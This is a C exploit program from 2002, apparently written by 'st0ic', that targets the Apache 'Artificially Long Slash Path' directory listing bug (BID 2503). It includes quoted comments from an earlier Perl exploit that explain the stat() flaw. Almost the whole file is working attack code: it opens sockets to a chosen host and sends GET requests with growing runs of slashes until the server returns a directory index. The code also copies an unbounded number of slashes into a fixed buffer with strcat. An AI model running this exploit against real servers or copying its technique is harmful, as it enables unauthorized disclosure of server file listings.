/*
Program: apacheslash.c
Original Date: 2-21-02
Version: 1.0
Platform: Linux (compiled on SuSE 7.3)
c0der: st0ic
site: www.fsix.net
e-mail: st0ic@blackcodemail.com

Revised:
	NONE thus far

Description: This program tests an Apache installation for the "Apache Artificially Long Slash Path 
Directory Listing Exploit."  See SecurityFocus.com BID 2503 - http://online.securityfocus.com/bid/2503 

Compile: gcc apacheslash.c -o apacheslash

Stuff: I know theres already 3 Perl scripts that test this bug out, but there execution time is horrible
so I was bored and decided to recode it in C for execution speed sake. On my box, I think it took
about 8 mins to send 1000 /'s to apache with apache2.pl. It takes about 2 seconds with this program.
BTW, SuSE 7.3 comes with Apache 1.3.20, which is NOT vulnerable :-). Check out the securityfocus.com
BID 2503 to find out whats vulnerable and whats not.

I also included the comments from apache2.pl exploit which was modified
by Siberian of sentry-labs.com. Read below for the details:

/*************************************************
#!/usr/bin/perl
#
# orginal by farm9, Inc. (copyright 2001)
# new modified code by Siberian (www.sentry-labs.com)
#
########################################################################################
#
# Note: This isn't the orginal exploit! This one was modified and partly rewritten. 
#
# Changes:
#
# - help added (more user firendly :-) )
# - messages added 
# - exploit is now able to be executed on WinNT or 2k.
# - uses perl version of BSD sockets (compatible to Windows)
# 
# Rewriter's Note: I rewrote (I was bored to death that evening :-) ) some
# of the code and made it esaier to use and cross platform compatible.
# The old verion used a esaier but not that compaible way of socket stream communication.  
# Any network code was replaced by cross platform compatible BSD sockets.
# (much better than any other stream method :-) )
# 
# Tested with Perl 5.6 (Linux) and ActivePerl 5.6 (Win32)
#
# Original comment and source is attached below.
#
########################################################################################
#
# Name: Apache Artificially Long Slash Path Directory Listing Exploit
# Author: Matt Watchinski
# Ref: SecurityFocus BID 2503
#
# Affects: Apache 1.3.17 and below
# Tested on: Apache 1.3.12 running on Debian 2.2
#
# Info:  This exploit tricks apache into returning a Index of the a directory
#    even if an index.html file is present.  May not work on some OS's
#
# Details: http_request.c has a subroutine called ap_sub_req_lookup_file that in
#	   very specific cases would feed stat() a filename that was longer than
#	   stat() could handle.  This would result in a condition where stat()
#	   would return 0 and a directory index would be returned instead of the
#	   default index.html.
#
# Code Fragment: /src/main/http_request.c
#    if (strchr(new_file, '/') == NULL) {
#        char *udir = ap_make_dirstr_parent(rnew->pool, r->uri);
#
#        rnew->uri = ap_make_full_path(rnew->pool, udir, new_file);
#        rnew->filename = ap_make_full_path(rnew->pool, fdir, new_file);
#        ap_parse_uri(rnew, rnew->uri);    /* fill in parsed_uri values */	/*
#        if (stat(rnew->filename, &rnew->finfo) < 0) {   <-- Important part
#            rnew->finfo.st_mode = 0;
#        }
#
# Conditions: Mod_dir / Mod_autoindex / Mod_negotiation need to be enabled
#	      The directory must also have the following Options enabled:
#             Indexes and MultiView
#	      Some OS's have different conditions on the number of character
#	      you have to pass to stat to make this work.  If stat doesn't
#	      return 0 for path names less than 8192 or so internal apache
#	      buffer checks will stop this exploit from working.
#
# 	      Debian needed around 4060 /'s to make this work.
#
# Greets: Special thanks to natasha who added a lot of debug to apache for me
#	  while i was trying to figure out what had to be enabled to make this
#	  exploit work.  Also thanks to rfp for pointing out that MultiView
#	  needed to be enabled.
#
# More Greets:  Jeff for not shooting me :) <All your Cisco's belong to us>
#               Anne for being so sexy <I never though corporate espionage
#                   would be so fun>
#               All my homies at farm9
#               DJ Charles / DJ NoloN for the phat beats
#               Marty (go go gadget snort)
#               All my ex-bees
#               RnVjazpIaXZlcndvcmxk
#
# I think that wraps it up.  Have fun.
-----snip snip----
**************************************************/

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

char tmp[10240];
char output[10240];
char *get = "GET ";
char *slash = "/";
char *http = " HTTP/1.0\r\n";
char *end = "\r\n\r\n";
int c, x;
int port;
int low;
int max;
int sockfd;
int bytes_recieved;
int count;
char *addr;

struct sockaddr_in dest_addr;
struct hostent *he;

void usage(char *ptr)
{
	fprintf(stderr, "\n\t%s <-h host> <-p port> <-l LOW> <-m MAX>", ptr);
	fprintf(stderr, "\n\tExample: %s -h 127.0.0.1 -p 80 -l 1 -m 1000\n", ptr);
	fprintf(stderr, "\n\tLOW is how many /'s to start with and MAX is how many /'s to end with.\n\n");
	exit(1);
}


int main(int argc, char *argv[])
{
	printf("\n\t[       apacheslash.c     ]");
	printf("\n\t[      c0ded by st0ic     ]");
	printf("\n\t[         Fsix.Net        ]");
	printf("\n\t[ st0ic@happyhack.zzn.com ]\n\n");

	while ( ( c = getopt(argc, argv, "h:p:l:m:") ) != -1)
	{
		switch(c)
		{
			case 'h':
			{
				addr = optarg;
				break;
			}
			case 'p':
			{
				port = atoi(optarg);
				break;
			}
			case 'l':
			{
				low = atoi(optarg);
				break;
			}
			case 'm':
			{
				max = atoi(optarg);
				break;
			}
			default:
				usage(argv[0]);
		}
	}

	if ( low > max || addr == NULL )
		usage(argv[0]);

	if ( (he = gethostbyname(addr)) == NULL)
	{
		perror("gethostbyname");
		exit(1);
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_addr = *( (struct in_addr *) he->h_addr);
	dest_addr.sin_port = htons(port);
	memset (&dest_addr.sin_zero, 0, 8);
	
	printf("\t\n....Working....\n");
	
	while (low <= max)
	{
		count = low;
		bzero(tmp, sizeof(tmp) );
		
		if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0) ) == -1)
		{
			perror("socket");
			break;
		}

		if (connect (sockfd, (struct sockaddr_in *) &dest_addr, sizeof(dest_addr) ) == -1)
		{
			perror("connect");
			exit(1);
		}
		
		strcpy(tmp, get);
		
		/* copy the necessary slashes. */
        for(x = 0; x < count; x++)
			strcat(tmp, slash);
		
		strcat(tmp, http);
		strcat(tmp, end);
		
		send(sockfd, tmp, sizeof(tmp), 0);
		
		bytes_recieved = 1;
		while(bytes_recieved > 0)
		{
			bytes_recieved = recv(sockfd, output, sizeof(output), 0);
			if ( (strstr(output, "Index of") ) != NULL)
			{
				printf("\n\tNumber of \"/\"'s required to generate a directory listing = %d\n", low);
				close(sockfd);
				exit(0);
			}
		}
		
		low++;
		close(sockfd);
	}
	
	printf("\nHost does not appear to be vulnerable. Maybe try some different numbers...\n");
	
	return 0;
}
